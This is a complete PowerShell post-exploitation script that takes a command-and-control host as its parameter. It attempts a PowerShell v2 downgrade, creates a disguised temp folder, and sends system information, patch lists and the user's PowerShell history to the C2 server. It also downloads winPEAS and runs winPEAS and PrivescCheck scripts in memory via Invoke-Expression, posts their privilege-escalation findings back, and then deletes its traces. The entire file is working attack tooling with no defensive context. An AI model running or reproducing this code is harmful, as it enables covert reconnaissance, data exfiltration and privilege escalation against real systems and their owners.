param(
    [Parameter(Mandatory=$true)]
    [string]$C2
)

# ----------------------------------------
# 0. Check for PowerShell v2 and relaunch if available
# ----------------------------------------
$v2Exists = Get-Command powershell.exe -ErrorAction SilentlyContinue | ForEach-Object {
    $true
}

if ($v2Exists -and $PSVersionTable.PSVersion.Major -gt 2) {
    powershell -version 2 -file $MyInvocation.MyCommand.Path -C2 $C2
    exit
}

# ----------------------------------------
# 1. Stealthy temp folder
# ----------------------------------------
$tmp = Join-Path $env:TEMP ("syscache_" + [guid]::NewGuid().ToString())
New-Item -ItemType Directory -Path $tmp -Force | Out-Null

# ----------------------------------------
# 2. Collect and POST systeminfo and wmi info
# ----------------------------------------
$sysInfo = systeminfo
Invoke-WebRequest -Uri "http://$C2:8080/g" -Method Post -Body ($sysInfo -join "`r`n") | Out-Null
$wmiInfo = wmi qfe
Invoke-WebRequest -Uri "http://$C2:8080/g" -Method Post -Body ($wmiInfo -join "`r`n") | Out-Null


# ----------------------------------------
# 3. Collect and POST PowerShell history
# ----------------------------------------
$histPath = (Get-PSReadlineOption).HistorySavePath
if (Test-Path $histPath) {
    $psHist = Get-Content $histPath
    Invoke-WebRequest -Uri "http://$C2:8080/g" -Method Post -Body ($psHist -join "`r`n") | Out-Null
}

# ----------------------------------------
# 4. Download winPEAS.exe (must touch disk)
# ----------------------------------------
$peasExe = Join-Path $tmp "winpeas.exe"
Invoke-WebRequest "http://$C2:8080/winpeas.exe" -OutFile $peasExe

# ----------------------------------------
# 5. Run winPEAS.exe → POST separately
# ----------------------------------------
$exeOut = & $peasExe
$outFileExe = Join-Path $tmp "winpeas_exe.txt"
$exeOut | Out-File $outFileExe -Encoding ASCII
Invoke-WebRequest -Uri "http://$C2:8080/p" -Method Post -InFile $outFileExe -ContentType "multipart/form-data" | Out-Null

# ----------------------------------------
# 6. Run winPEAS.ps1 in-memory → POST separately
# ----------------------------------------
$winPeasPs1 = (New-Object Net.WebClient).DownloadString("http://$C2:8080/winpeas.ps1")
Invoke-Expression $winPeasPs1
$ps1Out1 = Invoke-winPEAS
$outFilePs1 = Join-Path $tmp "winpeas_ps1.txt"
$ps1Out1 | Out-File $outFilePs1 -Encoding ASCII
Invoke-WebRequest -Uri "http://$C2:8080/p" -Method Post -InFile $outFilePs1 -ContentType "multipart/form-data" | Out-Null

# ----------------------------------------
# 7. Run PrivescCheck.ps1 in-memory → POST separately
# ----------------------------------------
$privescPs1 = (New-Object Net.WebClient).DownloadString("http://$C2:8080/PrivescCheck.ps1")
Invoke-Expression $privescPs1
$ps1Out2 = Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML
$outFilePrv = Join-Path $tmp "privesccheck.txt"
$ps1Out2 | Out-File $outFilePrv -Encoding ASCII
Invoke-WebRequest -Uri "http://$C2:8080/p" -Method Post -InFile $outFilePrv -ContentType "multipart/form-data" | Out-Null

# ----------------------------------------
# 8. Cleanup
# ----------------------------------------
Remove-Item $tmp -Recurse -Force
